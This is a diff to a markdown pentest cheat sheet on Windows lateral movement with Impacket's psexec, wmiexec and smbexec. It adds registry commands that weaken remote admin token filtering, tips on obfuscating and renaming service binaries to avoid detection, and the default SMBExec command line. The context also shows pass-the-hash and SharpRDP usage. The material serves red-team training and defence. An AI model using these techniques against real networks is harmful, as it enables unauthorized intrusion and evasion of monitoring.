@@ -11,6 +11,7 @@
 * [Impacket](#impacket)
     * [PSExec](#psexec)
     * [WMIExec](#wmiexec)
+    * [SMBExec](#smbexec)
 
 * [RDP Remote Desktop Protocol](#rdp-remote-desktop-protocol)
 * [Powershell Remoting Protocol](#powershell-remoting-protocol)
@@ -123,13 +124,13 @@ From [fortra/impacket](https://github.com/fortra/impacket) (:warning: renamed to
 All Impacket's *exec scripts are not equal, they will target services hosted on multiples ports. 
 The following table summarize the port used by each scripts.
 
-| Method      | Port Used                             |
-|-------------|---------------------------------------|
-| psexec.py   | tcp/445                               |
-| smbexec.py  | tcp/445                               |
-| atexec.py   | tcp/445                               |
-| dcomexec.py | tcp/135, tcp/445, tcp/49751 (DCOM)    |
-| wmiexec.py  | tcp/135, tcp/445, tcp/50911 (Winmgmt) |
+| Method      | Port Used                             | Admin Required |
+|-------------|---------------------------------------|----------------|
+| psexec.py   | tcp/445                               | Yes            |
+| smbexec.py  | tcp/445                               | No             |
+| atexec.py   | tcp/445                               | No             |
+| dcomexec.py | tcp/135, tcp/445, tcp/49751 (DCOM)    | No             |
+| wmiexec.py  | tcp/135, tcp/445, tcp/50911 (Winmgmt) | Yes            |
 
 * `psexec`: equivalent of Windows PSEXEC using RemComSvc binary.
     ```ps1
@@ -153,20 +154,37 @@ The following table summarize the port used by each scripts.
     wmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
     ```
 
+To allow Non-RID 500 local admin accounts performing Wmi or PsExec, execute: 
+`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1`
+To prevent RID 500 from being able to WmiExec or PsExec, execute:
+`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken /t REG_DWORD /f /d 1`
+
+
 ### PSExec
 
-PSExec default [kavika13/RemCom](https://github.com/kavika13/RemCom) binary is 10 years old, you might want to rebuild it and obfuscate it to reduce detections [snovvcrash/RemComObf.sh](https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb)
+Instead of uploading `psexeccsv` service binary, it uploads to `ADMIN$` a service binary with an arbitrary name.
+PSExec default [kavika13/RemCom](https://github.com/kavika13/RemCom) binary is 10 years old, you might want to rebuild it and obfuscate it to reduce detections ([snovvcrash/RemComObf.sh](https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb))
 
 Use a custom binary and service name with : `psexec.py Administrator:Password123@IP -service-name customservicename -remote-binary-name custombin.exe`    
 
 Also a custom file can be specified with the parameter : `-file /tmp/RemComSvcCustom.exe`.    
 You need to update the pipe name to match "Custom_communication" in the line 163     
-`fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)` 
+`fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)`. Alternatively you can use the fork [ThePorgs/impacket](https://github.com/ThePorgs/impacket/pull/3/files).
+
 
 ### WMIExec
 
 Use a non default share `-share SHARE` to write the output to reduce the detection.   
 By default this command is executed : `cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__RANDOM 2>&1`
+
+
+### SMBExec
+
+It creates a service with the name `BTOBTO` ([smbexec.py#L59](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L59)) and transfers commands from the attacker in a bat file in `%TEMP/execute.bat` ([smbexec.py#L56](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L56)).
+
+It will create a new service every time we execute a command. It will also generate an Event 7045.
+
+By default this command is execute: `%COMSPEC% /Q /c echo dir > \\127.0.0.1\C$\__output 2>&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat`, where `%COMSPEC%` points to `C:\WINDOWS\system32\cmd.exe`.
 
 
 ## RDP Remote Desktop Protocol 
@@ -214,7 +232,6 @@ Abuse RDP protocol to execute commands remotely with the following commands;
     ```powershell
     PS C:\> SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
     ```
-
 
 
 ## Powershell Remoting Protocol
@@ -339,5 +356,8 @@ PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
 - [Ropnop - Using credentials to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
 - [Ropnop - Using credentials to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 - [Gaining Domain Admin from Outside Active Directory](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)
-- [Impacket Remote code execution on Windows from Linux by Vry4n_ | Jun 20, 2021](https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/)
+- [Impacket Remote code execution on Windows from Linux by Vry4n_ - Jun 20, 2021](https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/)
 - [Impacket Exec Commands Cheat Sheet - 13cubed](https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet.pdf)
+- [SMB protocol cheatsheet - aas-s3curity](https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/post-exploitation/lateral-movement/smb-protocol)
+- [Windows Lateral Movement with smb, psexec and alternatives - nv2lt](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/)
+- [PsExec.exe IOCs and Detection - Threatexpress](https://threatexpress.com/redteaming/tool_ioc/psexec/)
